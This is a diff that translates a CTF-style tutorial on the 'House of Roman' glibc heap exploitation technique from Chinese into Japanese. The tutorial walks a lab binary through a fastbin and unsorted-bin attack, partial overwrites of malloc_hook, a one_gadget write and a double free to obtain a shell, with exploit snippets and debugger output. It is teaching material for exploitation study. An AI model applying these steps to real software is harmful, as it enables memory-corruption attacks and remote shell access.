@@ -1,32 +1,32 @@
 # House of Roman
 
-## 介绍
+## はじめに
 
-House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。
+House of Roman という技法は、簡単に言えば fastbin attack と Unsortbin attack を組み合わせた小さな trick です。
 
-## 概括
-
-
-
-该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。
+## 概要
 
 
 
-## 原理以及展示
+この手法は ASLR を回避するためのもので、12 ビットのブルートフォースによって shell を取得します。しかも、UAF の脆弱性が 1 つと、任意のサイズの chunk を作成できる状況さえあれば攻撃を完了できます。
 
 
 
-作者提供给了我们一个 demo 用于展示，整个利用过程大概可以分为三步骤。
-
-1. 将 FD 指向 malloc_hook
-2. 修正 0x71 的 Freelist
-3. 往 malloc_hook 写入 one gadget
+## 原理と実演
 
 
 
-先对 demo 进行一个大致的分析：
+作者は実演用の demo を提供してくれています。攻撃の全体の流れはおおよそ 3 つのステップに分けられます。
 
-开启的保护情况：
+1. FD を malloc_hook に向ける
+2. 0x71 の Freelist を修正する
+3. malloc_hook に one gadget を書き込む
+
+
+
+まず demo を大まかに分析します。
+
+有効になっている保護は次のとおりです。
 
 ```bash
 [*] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall'
@@ -37,7 +37,7 @@ House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin
     PIE:      PIE enabled
 ```
 
-样题中有三个主要功能，Malloc ，Write，以及 Free。
+サンプル問題には Malloc、Write、Free の 3 つの主な機能があります。
 
 ```c
     switch ( v4 )
@@ -61,7 +61,7 @@ House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin
         break;
 ```
 
-在 Free 功能中存在 指针未置零而造成的悬挂指针。
+Free の機能には、ポインタが 0 クリアされないために生じるダングリングポインタがあります。
 
 ```c
 void free_chunk()
@@ -77,11 +77,11 @@ void free_chunk()
 
 
 
-### 第一步
+### ステップ 1
 
-首先伪造一个 chunk  ，chunk的大小为0x61。紧接着我们利用 partial overwrite 将 FD 指向伪造的chunk（当然，这里我们也可以用 UAF 完成）。
+まず chunk を 1 つ偽造します。この chunk のサイズは 0x61 です。続いて partial overwrite を使って、FD を偽造した chunk に向けます(もちろん、ここは UAF でも実現できます)。
 
-伪造 chunk size
+chunk の size を偽造します。
 
 ```bash
 pwndbg>
@@ -92,7 +92,7 @@ pwndbg>
 0x555555757090: 0x41414141      0x41414141      0x61    0x0     <----------
 ```
 
-这里，我们 free 掉 chunk 1，这个时候我们能获得一个 unsortbin
+ここで chunk 1 を free すると、unsortbin が 1 つ得られます。
 
 ```
 0x555555757020 PREV_INUSE {
@@ -105,7 +105,7 @@ pwndbg>
 }
 ```
 
-接着，我们重分配 0xd1 这块 chunk，以及修改其 size 为0x71
+続いて、この 0xd1 の chunk を再確保し、その size を 0x71 に書き換えます。
 
 ```
 pwndbg> x/40ag 0x555555757020
@@ -121,7 +121,7 @@ pwndbg> x/40ag 0x555555757020
 
 
 
-我们紧接着需要修正这0x71 FD freelist ，将其伪造成已经释放的块
+続いて、この 0x71 の FD freelist を修正し、解放済みのブロックに見えるように偽造する必要があります。
 
 ```
 pwndbg> x/40ag 0x555555757000
@@ -154,27 +154,27 @@ pwndbg> x/40ag 0x555555757000
 libc : 0x7ffff7a23d28 ("malloc_hook")
 ```
 
-这个时候我们的 FD 已经在 malloc hook 附近，为之后的爆破做准备。
+この時点で FD はすでに malloc hook の近くにあり、後のブルートフォースの準備ができています。
 
-### 第二步
+### ステップ 2
 
-我们只需要通过 释放一块0x71大小的 chunk 就能完成 fix。
-
-
-
-### 第三步
-
-利用 unsortebin 的攻击技巧，并使用编辑功能将 onegadet 写入	。
+0x71 サイズの chunk を 1 つ解放するだけで、修正を完了できます。
 
 
 
-## 分析 exp
+### ステップ 3
+
+unsortebin の攻撃テクニックを使い、編集機能で onegadet を書き込みます。
 
 
 
-分配 `3` 个 `chunk` ，在 `B + 0x78` 处设置 `p64(0x61)` ， 作用是 `fake size` ,用于后面 的 `fastbin attack`
+## exp の分析
 
-
+
+
+`3` つの `chunk` を確保し、`B + 0x78` に `p64(0x61)` を設定します。これは `fake size` で、後の `fastbin attack` に使います。
+
+
 
 ```python
 create(0x18,0) # 0x20
@@ -188,7 +188,7 @@ edit(1,fake)
 info("fake")
 ```
 
-释放掉 `B` , 然后分配同样大小再次分配到 `B` , 此时 `B+0x10` 和 `B+0x18` 中有 `main_arean` 的地址。分配 `3` 个 `fastbin` ，利用 `off by one` 修改 `B->size = 0x71`
+`B` を解放し、同じサイズで再び確保して `B` を得ます。このとき `B+0x10` と `B+0x18` には `main_arean` のアドレスが入っています。`3` つの `fastbin` を確保し、`off by one` を利用して `B->size = 0x71` に書き換えます。
 
 ```
 free(1)
@@ -204,7 +204,7 @@ edit(0,over)
 info("利用 off by one ,  chunk  1's size --> 0x71")
 ```
 
-生成两个 `fastbin` ，然后利用 `uaf` ，部分地址写，把 `B` 链入到 `fastbin`
+2 つの `fastbin` を作り、`uaf` と部分的なアドレス書き込みによって、`B` を `fastbin` にリンクします。
 
  
 
@@ -218,7 +218,7 @@ info("把 chunk'1 链入到 fastbin 里面")
 
 ```
 
-调试看看此时 `fastbin` 的状态
+デバッグして、このときの `fastbin` の状態を見てみましょう。
 
  
 
@@ -234,21 +234,21 @@ fastbins
 0x80: 0x0
 ```
 
-> `0x555555757020` 就是 `chunk B`
+> `0x555555757020` が `chunk B` です
 
- 然后通过修改 `B->fd` 的低 `2` 字节， 使得 `B->fd= malloc_hook - 0x23`
+ 続いて `B->fd` の下位 `2` バイトを書き換え、`B->fd= malloc_hook - 0x23` にします。
 
  
 
 ```
-# malloc_hook 上方
+# malloc_hook の上方
 malloc_hook_nearly = "\xed\x1a"
 edit(1,malloc_hook_nearly)
 info("部分写，修改 fastbin->fd ---> malloc_hook")
 
 ```
 
-然后分配 `3` 个 `0x70` 的 `chunk` ，就可以拿到 `malloc_hook` 所在的那个 `chunk` .
+その後 `3` つの `0x70` の `chunk` を確保すると、`malloc_hook` のある chunk を得られます。
 
  
 
@@ -258,7 +258,7 @@ create(0x65,0)
 create(0x65,0)
 ```
 
-然后 `free` 掉 `E` ，进入 `fastbin` ，利用 `uaf` 设置 `E->fd = 0` ， 修复了 `fastbin`
+続いて `E` を `free` して `fastbin` に入れ、`uaf` で `E->fd = 0` を設定して、`fastbin` を修復します。
 
 ```
 free(15)
@@ -266,7 +266,7 @@ edit(15,p64(0x00))
 info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")
 ```
 
-然后是 unsorted bin 攻击，使得 malloc_hook 的值为 main_arena+88
+その後 unsorted bin attack を行い、malloc_hook の値を main_arena+88 にします。
 
  
 
@@ -284,7 +284,7 @@ create(0xc8,1)
 info("unsorted bin 使得 malloc_hook 有 libc 的地址")
 ```
 
-利用 修改 `malloc_hook` 的低三个字节 ，使得 `malloc_hook` 为 `one_gadget` 的地址
+`malloc_hook` の下位 3 バイトを書き換え、`malloc_hook` を `one_gadget` のアドレスにします。
 
  
 
@@ -296,7 +296,7 @@ edit(0,over)
 info("malloc_hook to one_gadget")
 ```
 
-然后 `free`  两次同一个  `chunk`  ，触发  `malloc_printerr`  ， `getshell`
+その後、同じ `chunk` を 2 回 `free` して `malloc_printerr` を発動させ、`getshell` します。
 
  
 
@@ -307,7 +307,7 @@ free(18)
 
 
 
-## link
+## リンク
 
 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc
 
